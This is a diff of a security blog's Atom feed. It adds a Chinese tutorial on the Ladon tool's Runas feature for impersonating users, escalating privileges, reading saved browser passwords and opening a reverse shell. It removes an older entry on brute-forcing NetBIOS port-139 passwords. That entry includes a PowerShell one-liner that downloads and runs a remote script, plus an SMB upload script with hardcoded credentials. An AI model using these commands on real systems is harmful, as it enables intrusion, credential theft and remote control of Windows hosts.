@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-12-30T17:32:46.667Z</updated>
+  <updated>2020-12-30T17:42:47.580Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖教程〗Ladon非交互式runas执行命令/反弹SHELL</title>
+    <link href="http://k8gege.org/p/ladonnetsh.html"/>
+    <id>http://k8gege.org/p/ladonnetsh.html</id>
+    <published>2020-12-30T17:10:00.000Z</published>
+    <updated>2020-12-30T17:42:47.580Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的shell下使用麻烦。而Ladon的Runas则完美解决了以上问题，支持非交互式模拟登陆指定用户运行程序或命令。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>1.本机用户密码验证（权限不够读不到帐密或HASH的情况下，验证用户是否使用某个已知密码）<br>2.SYSTEM权限降权，SYS权限下以用户身份执行命令，实现会话穿透，或访问特定用户的DBAPI加密数据<br>3.低权限用户提权，网络服务帐户或用户权限下使用管理员权限来执行一些必须管理员才能执行的命令<br>4.浏览器密码读取，本机存在多个用户，需要读取对应用户保存帐密（DBAPI），如Chrome、Firefox<br>5.以指定用户权限反弹SHELL，当然也可以转发特定交互式命令行程序</p><p>提示：Runas条件是有帐密，提权降权也可使用GetSystem，无需帐密只需指定对应用户权限进程即可</p><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon Runas user pass cmd</span><br><span class="line">Ladon Runas user pass cmd domain</span><br><span class="line">Ladon RunasCS user pass cmd.exe ip port</span><br></pre></td></tr></table></figure><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>当前机器默认开启UAC，登陆用户为null，管理员用户为k8gege，默认管理员用户为Administrator<br>Runas在不同权限下模拟其它用户权限有一定区别，如UAC下模拟非内置管理员用户则受到UAC限制。</p><h3 id="测试目的"><a href="#测试目的" class="headerlink" title="测试目的"></a>测试目的</h3><p>以不同权限模拟登陆同一用户执行添加用户命令，对比Runas的执行权限<br>为什么用添加用户权限来对比，因为用户或管理员UAC是无法添加用户的<br>通过是否可添加用户，可轻易区分模拟后的权限到底是具备什么权限</p><h3 id="Uac权限"><a href="#Uac权限" class="headerlink" title="Uac权限"></a>Uac权限</h3><p>非内置管理员用户在UAC权限下执行命令继承UAC权限，无法通过该用户权限添加用户<br>但是模拟内置管理员Administrator权限则不受UAC影响，可以通过该权限添加用户。</p><p>Ladon Runas k8gege k8gege520 whoami<br>Ladon Runas Administrator k8gege520 whoami</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasUac.PNG"></p><h3 id="Administrator权限"><a href="#Administrator权限" class="headerlink" title="Administrator权限"></a>Administrator权限</h3><p>管理员权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p><h3 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h3><p>SYSTEM权限下模拟非内置管理员用户权限，是可以添加用户的<br>Ladon Runas k8gege k8gege520 whoami</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasAdmin.PNG"></p><h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>版本Ladon&gt;=7.8<br>LadonGUI–Netcat监听,执行以下命令即可以指定用户权限反弹shell<br>Ladon RunasCS user pass cmd.exe ip port<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在UAC下需要模拟管理员权限执行命令，先过UAC或使用内置管理员<br>管理员或SYSTEM权限模拟的用户具备什么权限，它就有对应的权限</p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;Ladon内置Runas允许用户用其他权限运行指定的工具和程序。系统自带Runas命令需要交互式登陆，在webshell或不支持交互式的sh
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="netsh" scheme="http://k8gege.org/tags/netsh/"/>
+    
+  </entry>
   
   <entry>
     <title>〖教程〗Ladon 7.8 netsh端口转发/端口映射</title>
@@ -552,34 +580,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖教程〗NbtScan 139端口弱口令/Netbios密码爆破</title>
-    <link href="http://k8gege.org/p/NbtScan.html"/>
-    <id>http://k8gege.org/p/NbtScan.html</id>
-    <published>2020-08-01T07:20:00.000Z</published>
-    <updated>2020-08-01T16:31:57.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/NbtScan.html";</script><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon &gt;= 7.1</p><h3 id="139端口"><a href="#139端口" class="headerlink" title="139端口"></a>139端口</h3><p>NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于Windows”文件和打印机共享”和SAMBA。</p><h3 id="IPC-通信"><a href="#IPC-通信" class="headerlink" title="IPC$通信"></a>IPC$通信</h3><p>Windows系统中的net use ipc$整个通信过程，先445-&gt;137-&gt;139验证，当你开启防火墙禁用445，发现系统命令就无法连接IPC了，根本没机会走到139，所以使用系统自带命令连接的ipc$需要同时开启这些端口。说入侵139就是IPC$的说法是错误的，就像说wmiexec.vbs可完全替代PSEXEC工具一样，这个脚本需要目标开启135和445，因为它通过445来传输结果，意味着目标只开放135这个VBS的回显就没有了，其实假设目标只开放445，这个VBS脚本还能执行命令吗？哪来的替代或扔掉？这个系统的IPC$连接也是同理，测试首先得把其它端口禁了再说话。虽然系统自带命令需要同时开启，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的，详情参考impacket。</p><h3 id="Nbt爆破"><a href="#Nbt爆破" class="headerlink" title="Nbt爆破"></a>Nbt爆破</h3><p>系统自带命令需要同时开启139和445，但是 自己实现SMB服务器的话是可以只使用139或只用445端口的。系统的IPC$就像读取系统密码一样，可以先植入CS再用MIMI插件读取，但是我们也可以不使用CS，直接MIMI读取密码啊。基于和MIMI可以独立读取密码的原理，反向思路我们也可以完全不走445，直接通过139验证WINDOWS密码，所以这个和IPC$不一样(指的是系统命令连接的ipc)，所以为了防止大家误解，起名为NbtScan。毕竟走的也是Netbios，系统IPC$验证一是时间非常久，且必须开启445，如果445都开了为何不用SmbScan验证密码呢？但是由于近几年勒索病毒横行，可能很多机器默认会关闭445，所以会导致无法通过445验证密码，但是没关系还有139啊。</p><h3 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h3><h4 id="139端口-Netbios密码爆破-Windows"><a href="#139端口-Netbios密码爆破-Windows" class="headerlink" title="139端口 Netbios密码爆破(Windows)"></a>139端口 Netbios密码爆破(Windows)</h4><p>Ladon 192.168.1.8/24 NbtScan<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/NbtScan.PNG"></p><h3 id="PowerLadon"><a href="#PowerLadon" class="headerlink" title="PowerLadon"></a>PowerLadon</h3><h4 id="远程加载NbtScan-139端口弱口令爆破"><a href="#远程加载NbtScan-139端口弱口令爆破" class="headerlink" title="远程加载NbtScan 139端口弱口令爆破"></a>远程加载NbtScan 139端口弱口令爆破</h4><p>powershell “IEX (New-Object Net.WebClient).DownloadString(‘<a href="http://192.168.1.3:800/Ladon7.1_all.ps1&#39;" target="_blank" rel="noopener">http://192.168.1.3:800/Ladon7.1_all.ps1&#39;</a>); Ladon 192.168.1.141 NbtScan”</p><h3 id="139传输文件"><a href="#139传输文件" class="headerlink" title="139传输文件"></a>139传输文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> smb.SMBConnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"><span class="keyword">from</span> nmb.NetBIOS <span class="keyword">import</span> NetBIOS</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBIOSName</span><span class="params">(remote_smb_ip, timeout=<span class="number">30</span>)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bios = NetBIOS()</span><br><span class="line">        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> &gt;&gt; sys.stderr, <span class="string">"Looking up timeout, check remote_smb_ip again!!"</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        bios.close()</span><br><span class="line">        <span class="keyword">return</span> srv_name</span><br><span class="line">serverip=<span class="string">'192.168.1.40'</span></span><br><span class="line">conn = SMBConnection(<span class="string">'k8gege'</span>, <span class="string">'k8gege520'</span>, <span class="string">'C$'</span>,getBIOSName(serverip)[<span class="number">0</span>], use_ntlm_v2 = <span class="literal">True</span>) </span><br><span class="line"><span class="keyword">assert</span> conn.connect(serverip, <span class="number">139</span>)</span><br><span class="line"><span class="comment">#temdir='/'</span></span><br><span class="line"><span class="comment">#dir=os.path.join('/','public')</span></span><br><span class="line">f = open(<span class="string">'C:/123.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">conn.storeFile(<span class="string">'Users'</span>,<span class="string">'234.txt'</span>,f)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="netbios" scheme="http://k8gege.org/tags/netbios/"/>
     
   </entry>
   
